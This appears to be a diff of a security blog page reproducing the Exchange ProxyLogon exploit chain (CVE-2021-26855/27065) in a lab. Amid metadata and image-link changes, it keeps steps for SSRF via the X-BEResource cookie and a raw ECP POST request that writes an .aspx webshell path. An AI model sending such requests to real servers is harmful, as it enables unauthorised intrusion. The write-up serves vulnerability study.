@@ -6,17 +6,23 @@
   <meta name="keywords" content=" 漏洞复现 ">
   <meta name="description" content="Exchange (CVE-2021-26855和CVE-2021-27065)复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Become a hacker">
+<meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Writing">
-<meta property="og:url" content="http://422926799.github.io/Writing/index.html">
+<meta property="og:title" content="Href">
+<meta property="og:url" content="http://422926799.github.io/Href/index.html">
 <meta property="og:site_name" content="九世的博客">
-<meta property="og:description" content="Become a hacker">
+<meta property="og:description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-08-05T03:08:20.827Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/15/VoIuzd.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/15/VoIxmt.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/15/Voo9k8.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/15/Vo7WlQ.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/12/QyK8Ug.md.png">
+<meta property="og:updated_time" content="2020-07-14T07:45:36.105Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Writing">
-<meta name="twitter:description" content="Become a hacker">
+<meta name="twitter:title" content="Href">
+<meta name="twitter:description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/06/15/VoIuzd.md.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -1901,7 +1907,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2021-09-23 17:25:43">2021-09-23 16:39</time>
+        创建时间:<time class="date" title="更新时间: 2021-09-23 17:31:56">2021-09-23 16:39</time>
         
     </div>
     <div class="article-meta">
@@ -2027,9 +2033,9 @@ Content-Length: 338
 <p>然后构造请求cookie：X-BEResource=&lt;上一步获取到Exchange Server HostName&gt;/autodiscover/autodiscover.xml?a=~1;<br><img src="https://z3.ax1x.com/2021/09/23/4wBAfA.png" alt=""></p>
 <p>获取legacYDN<br><img src="https://www.mpimg.cn/images/2021/09/23/Image.png" alt=""></p>
 <p>然后请求得到SID<br><img src="https://www.mpimg.cn/images/2021/09/23/Imagec39d926bdc3e3d63.png" alt=""></p>
-<p>构造JSON请求获取登录cookie<br><img src="https://www.mpimg.cn/image/V33n" alt=""></p>
-<p>请求获取ECP的RawIdentity<br><img src="https://www.mpimg.cn/image/VV9r" alt=""></p>
-<p>shell写入<br><img src="https://www.mpimg.cn/image/VW7Z" alt=""></p>
+<p>构造JSON请求获取登录cookie<br><img src="https://www.mpimg.cn/images/2021/09/23/Image1dfa6cfa6c16e4ad.png" alt=""></p>
+<p>请求获取ECP的RawIdentity<br><img src="https://www.mpimg.cn/images/2021/09/23/Image68352f9b96279cd9.png" alt=""></p>
+<p>shell写入<br><img src="https://www.mpimg.cn/images/2021/09/23/Imagef068ad3d2a095634.png" alt=""></p>
 <p>路径写入并重置</p>
 <pre><code>POST /ecp/iikj.js HTTP/1.1
 Host: 192.168.93.135
@@ -2043,7 +2049,7 @@ Content-Type: application/json; charset=utf-8
 Content-Length: 393
 
 {&quot;identity&quot;: {&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: &quot;977787fb-ece0-454e-9363-2cd8579ca39e&quot;}, &quot;properties&quot;: {&quot;Parameters&quot;: {&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;FilePathName&quot;: &quot;\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\c1gfR60IjXo3CBSLuwtW.aspx&quot;}}}
-</code></pre><p><img src="https://www.mpimg.cn/image/Vnx3" alt=""></p>
+</code></pre><p><img src="https://www.mpimg.cn/images/2021/09/23/Image55f36ab04c398cb9.png" alt=""></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/-zhong/p/14533053.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/14533053.html</a><br><a href="https://forum.butian.net/share/539" target="_blank" rel="noopener">https://forum.butian.net/share/539</a><br><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a><br><a href="https://jishuin.proginn.com/p/763bfbd5ac72" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd5ac72</a></p>
 
       
@@ -2058,7 +2064,7 @@ Content-Length: 393
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
     <p><span class="copy-title">发布时间:</span>2021-09-23, 16:39:40</p>
-    <p><span class="copy-title">最后更新:</span>2021-09-23, 17:25:43</p>
+    <p><span class="copy-title">最后更新:</span>2021-09-23, 17:31:56</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/a0e15799.html" title="Exchange (CVE-2021-26855和CVE-2021-27065)复现">http://422926799.github.io/posts/a0e15799.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
